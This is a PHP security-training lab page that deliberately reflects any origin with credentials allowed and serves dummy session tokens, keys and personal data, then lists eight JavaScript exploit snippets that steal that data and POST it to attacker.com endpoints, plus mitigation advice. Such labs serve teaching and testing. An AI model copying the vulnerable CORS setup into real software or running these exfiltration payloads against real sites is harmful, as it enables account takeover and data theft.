<?php
// Lab 3: CORS with Credentials
// Vulnerability: CORS with credentials leading to data theft

session_start();

$message = '';
$cors_headers = [];

// Simulate CORS with credentials
function set_cors_headers() {
    // Vulnerable: CORS with credentials from any origin
    $origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
    
    // Vulnerable: Accept any origin with credentials
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Custom-Header");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Expose-Headers: X-Session-Data, X-User-Token, X-Admin-Key");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}

// Set CORS headers
set_cors_headers();

// Simulate user session data
if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = 1;
    $_SESSION['username'] = 'admin';
    $_SESSION['role'] = 'administrator';
    $_SESSION['permissions'] = ['read', 'write', 'delete', 'admin'];
    $_SESSION['api_key'] = 'api_key_12345';
    $_SESSION['admin_token'] = 'admin_token_67890';
}

// Simulate API endpoint with session data
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action'])) {
    $action = $_GET['action'];
    
    switch ($action) {
        case 'session':
            $session_data = [
                'user_id' => $_SESSION['user_id'],
                'username' => $_SESSION['username'],
                'role' => $_SESSION['role'],
                'permissions' => $_SESSION['permissions'],
                'api_key' => $_SESSION['api_key'],
                'admin_token' => $_SESSION['admin_token'],
                'session_id' => session_id(),
                'login_time' => date('Y-m-d H:i:s'),
                'last_activity' => date('Y-m-d H:i:s')
            ];
            header('Content-Type: application/json');
            header('X-Session-Data: true');
            header('X-User-Token: ' . $_SESSION['api_key']);
            header('X-Admin-Key: ' . $_SESSION['admin_token']);
            echo json_encode($session_data);
            exit();
            
        case 'user_data':
            $user_data = [
                'id' => $_SESSION['user_id'],
                'username' => $_SESSION['username'],
                'email' => 'admin@example.com',
                'full_name' => 'Administrator User',
                'phone' => '+1-555-0123',
                'address' => '123 Admin Street, City, State 12345',
                'ssn' => '123-45-6789',
                'credit_card' => '4111-1111-1111-1111',
                'role' => $_SESSION['role'],
                'permissions' => $_SESSION['permissions'],
                'api_key' => $_SESSION['api_key'],
                'admin_token' => $_SESSION['admin_token']
            ];
            header('Content-Type: application/json');
            header('X-Session-Data: true');
            header('X-User-Token: ' . $_SESSION['api_key']);
            echo json_encode($user_data);
            exit();
            
        case 'admin_data':
            $admin_data = [
                'admin_panel_url' => 'http://admin.example.com/dashboard',
                'database_credentials' => 'mysql://admin:password@localhost:3306/production',
                'api_keys' => [
                    'stripe' => 'sk_live_1234567890',
                    'aws' => 'AKIAIOSFODNN7EXAMPLE',
                    'google' => 'AIzaSyBOti4mM-6x9WDnZIjIey21xXQK8QJjJjJ'
                ],
                'server_info' => [
                    'hostname' => 'prod-server-01',
                    'ip_address' => '192.168.1.100',
                    'os' => 'Ubuntu 20.04 LTS',
                    'php_version' => '8.1.0'
                ],
                'backup_location' => '/var/backups/database/',
                'log_files' => '/var/log/apache2/access.log',
                'session_id' => session_id(),
                'admin_token' => $_SESSION['admin_token']
            ];
            header('Content-Type: application/json');
            header('X-Session-Data: true');
            header('X-Admin-Key: ' . $_SESSION['admin_token']);
            echo json_encode($admin_data);
            exit();
    }
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (isset($input['action'])) {
        switch ($input['action']) {
            case 'update_session':
                $_SESSION['last_activity'] = date('Y-m-d H:i:s');
                $message = '<div class="alert alert-success">Session updated successfully!</div>';
                break;
            case 'change_password':
                $message = '<div class="alert alert-success">Password changed successfully!</div>';
                break;
            case 'admin_action':
                $message = '<div class="alert alert-success">Admin action executed!</div>';
                break;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 3: CORS with Credentials - CORS Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .api-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .credentials-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CORS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 3: CORS with Credentials</h1>
            <p class="hero-subtitle">CORS with credentials leading to data theft</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates CORS vulnerabilities where the server accepts credentials from any origin. This allows attackers to make authenticated requests and steal sensitive session data, API keys, and other credentials.</p>
            <p><strong>Objective:</strong> Exploit CORS with credentials to steal session data and perform unauthorized actions.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable CORS Headers
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: CORS with credentials from any origin
function set_cors_headers() {
    $origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
    
    // Vulnerable: Accept any origin with credentials
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Custom-Header");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Expose-Headers: X-Session-Data, X-User-Token, X-Admin-Key");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-lock me-2"></i>Credentials CORS Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="credentials-warning">
                            <h5>⚠️ Credentials CORS Warning</h5>
                            <p>This lab demonstrates CORS with credentials vulnerabilities:</p>
                            <ul>
                                <li><code>Access-Control-Allow-Credentials: true</code> - Allows credentials</li>
                                <li><code>Access-Control-Allow-Origin: $origin</code> - Accepts any origin</li>
                                <li><code>Access-Control-Expose-Headers</code> - Exposes sensitive headers</li>
                                <li><code>Session data</code> - Exposes session information</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Session API Endpoints</h5>
                            <p>Try these session endpoints:</p>
                            <ul>
                                <li><code>?action=session</code> - Session data</li>
                                <li><code>?action=user_data</code> - User data with credentials</li>
                                <li><code>?action=admin_data</code> - Admin data with tokens</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testCredentialsCORS('session')" class="btn btn-primary me-2">Test Session Data</button>
                            <button onclick="testCredentialsCORS('user_data')" class="btn btn-primary me-2">Test User Data</button>
                            <button onclick="testCredentialsCORS('admin_data')" class="btn btn-primary">Test Admin Data</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>API Response
                    </div>
                    <div class="card-body">
                        <div class="api-display">
                            <h5>API Response (May contain sensitive session data):</h5>
                            <div id="api-response">Click a button above to test the API</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> CORS with Credentials</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> GET/POST</li>
                        <li><strong>Issue:</strong> Credentials with any origin</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Session Theft:</strong> Steal session data</li>
                        <li><strong>Token Theft:</strong> Steal API tokens</li>
                        <li><strong>Admin Access:</strong> Access admin data</li>
                        <li><strong>Credential Abuse:</strong> Abuse stolen credentials</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Credentials CORS Exploitation Examples</h5>
            <p>Use these techniques to exploit CORS with credentials:</p>
            
            <h6>1. Basic Credentials CORS Exploitation:</h6>
            <div class="code-block">// Exploit CORS with credentials from any origin
fetch('http://vulnerable-site.com/api?action=session', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => {
    // Access exposed headers
    const sessionData = response.headers.get('X-Session-Data');
    const userToken = response.headers.get('X-User-Token');
    const adminKey = response.headers.get('X-Admin-Key');
    
    console.log('Exposed headers:', {
        sessionData,
        userToken,
        adminKey
    });
    
    return response.json();
})
.then(data => {
    console.log('Stolen session data:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-session', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>2. Session Data Theft:</h6>
            <div class="code-block">// Steal session data via CORS with credentials
fetch('http://vulnerable-site.com/api?action=session', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Session data stolen:', data);
    
    // Extract sensitive information
    const sessionId = data.session_id;
    const apiKey = data.api_key;
    const adminToken = data.admin_token;
    const permissions = data.permissions;
    
    // Send to attacker server
    fetch('http://attacker.com/steal-session', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            timestamp: new Date().toISOString(),
            sessionData: data,
            extractedInfo: {
                sessionId,
                apiKey,
                adminToken,
                permissions
            }
        })
    });
});</div>

            <h6>3. User Data with Credentials:</h6>
            <div class="code-block">// Steal user data with credentials
fetch('http://vulnerable-site.com/api?action=user_data', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('token')
    }
})
.then(response => response.json())
.then(data => {
    console.log('User data stolen:', data);
    
    // Extract sensitive information
    const ssn = data.ssn;
    const creditCard = data.credit_card;
    const apiKey = data.api_key;
    const adminToken = data.admin_token;
    
    // Send to attacker server
    fetch('http://attacker.com/steal-user-data', {
        method: 'POST',
        body: JSON.stringify({
            timestamp: new Date().toISOString(),
            userData: data,
            sensitiveInfo: {
                ssn,
                creditCard,
                apiKey,
                adminToken
            }
        })
    });
});</div>

            <h6>4. Admin Data Theft:</h6>
            <div class="code-block">// Steal admin data with credentials
fetch('http://vulnerable-site.com/api?action=admin_data', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('admin_token')
    }
})
.then(response => response.json())
.then(data => {
    console.log('Admin data stolen:', data);
    
    // Extract admin information
    const adminPanelUrl = data.admin_panel_url;
    const databaseCredentials = data.database_credentials;
    const apiKeys = data.api_keys;
    const serverInfo = data.server_info;
    
    // Send to attacker server
    fetch('http://attacker.com/steal-admin-data', {
        method: 'POST',
        body: JSON.stringify({
            timestamp: new Date().toISOString(),
            adminData: data,
            extractedInfo: {
                adminPanelUrl,
                databaseCredentials,
                apiKeys,
                serverInfo
            }
        })
    });
});</div>

            <h6>5. POST Request with Credentials:</h6>
            <div class="code-block">// Exploit POST requests with credentials
fetch('http://vulnerable-site.com/api', {
    method: 'POST',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('token'),
        'X-Custom-Header': 'malicious-value'
    },
    body: JSON.stringify({
        action: 'update_session',
        last_activity: new Date().toISOString()
    })
})
.then(response => response.json())
.then(data => {
    console.log('Session update result:', data);
});</div>

            <h6>6. Cookie and Session Theft:</h6>
            <div class="code-block">// Steal cookies and session data
fetch('http://vulnerable-site.com/api?action=session', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json'
    }
})
.then(response => response.json())
.then(data => {
    // Get cookies from document.cookie
    const cookies = document.cookie;
    const sessionId = data.session_id;
    const apiKey = data.api_key;
    
    console.log('Stolen cookies:', cookies);
    console.log('Stolen session ID:', sessionId);
    console.log('Stolen API key:', apiKey);
    
    // Send to attacker server
    fetch('http://attacker.com/steal-cookies-session', {
        method: 'POST',
        body: JSON.stringify({
            timestamp: new Date().toISOString(),
            cookies: cookies,
            sessionData: data,
            extractedInfo: {
                sessionId,
                apiKey
            }
        })
    });
});</div>

            <h6>7. Real-time Session Monitoring:</h6>
            <div class="code-block">// Continuous monitoring of session data
setInterval(() => {
    fetch('http://vulnerable-site.com/api?action=session', {
        method: 'GET',
        credentials: 'include',
        mode: 'cors'
    })
    .then(response => response.json())
    .then(data => {
        console.log('Real-time session data:', data);
        
        // Send to attacker server
        fetch('http://attacker.com/monitor-session', {
            method: 'POST',
            body: JSON.stringify({
                timestamp: new Date().toISOString(),
                sessionData: data
            })
        });
    });
}, 30000); // Every 30 seconds</div>

            <h6>8. Advanced Credentials Exploitation:</h6>
            <div class="code-block">// Exploit all endpoints with credentials
async function exploitAllCredentials() {
    const endpoints = ['session', 'user_data', 'admin_data'];
    
    for (const endpoint of endpoints) {
        try {
            const response = await fetch(`http://vulnerable-site.com/api?action=${endpoint}`, {
                method: 'GET',
                credentials: 'include',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + localStorage.getItem('token'),
                    'X-Custom-Header': 'malicious-value'
                }
            });
            
            // Extract all headers
            const headers = {};
            response.headers.forEach((value, key) => {
                headers[key] = value;
            });
            
            const data = await response.json();
            
            console.log(`${endpoint} data and headers:`, { data, headers });
            
            // Send to attacker
            fetch('http://attacker.com/steal-all-credentials', {
                method: 'POST',
                body: JSON.stringify({
                    endpoint: endpoint,
                    data: data,
                    headers: headers,
                    timestamp: new Date().toISOString()
                })
            });
            
        } catch (error) {
            console.error(`Failed to exploit ${endpoint}:`, error);
        }
    }
}

exploitAllCredentials();</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Session hijacking and account takeover</li>
                <li>API key theft and abuse</li>
                <li>Admin panel access and privilege escalation</li>
                <li>Cookie theft and session manipulation</li>
                <li>Data theft and sensitive information disclosure</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Never use wildcard (*) origin with credentials</li>
                    <li>Use specific origins instead of wildcard</li>
                    <li>Implement proper origin validation</li>
                    <li>Use whitelist-based CORS policies</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual cross-origin requests</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use Content Security Policy (CSP)</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Audit exposed headers and minimize exposure</li>
                    <li>Use secure session management</li>
                    <li>Implement proper token validation</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testCredentialsCORS(action) {
            fetch(`?action=${action}`, {
                method: 'GET',
                credentials: 'include',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Custom-Header': 'malicious-value'
                }
            })
            .then(response => {
                // Access exposed headers
                const sessionData = response.headers.get('X-Session-Data');
                const userToken = response.headers.get('X-User-Token');
                const adminKey = response.headers.get('X-Admin-Key');
                
                let headerInfo = '';
                if (sessionData) headerInfo += `<div class="alert alert-warning">X-Session-Data: ${sessionData}</div>`;
                if (userToken) headerInfo += `<div class="alert alert-warning">X-User-Token: ${userToken}</div>`;
                if (adminKey) headerInfo += `<div class="alert alert-warning">X-Admin-Key: ${adminKey}</div>`;
                
                return response.json().then(data => ({
                    data: data,
                    headers: headerInfo
                }));
            })
            .then(result => {
                document.getElementById('api-response').innerHTML = 
                    result.headers + 
                    '<pre>' + JSON.stringify(result.data, null, 2) + '</pre>';
            })
            .catch(error => {
                document.getElementById('api-response').innerHTML = '<div class="alert alert-danger">Error: ' + error.message + '</div>';
            });
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
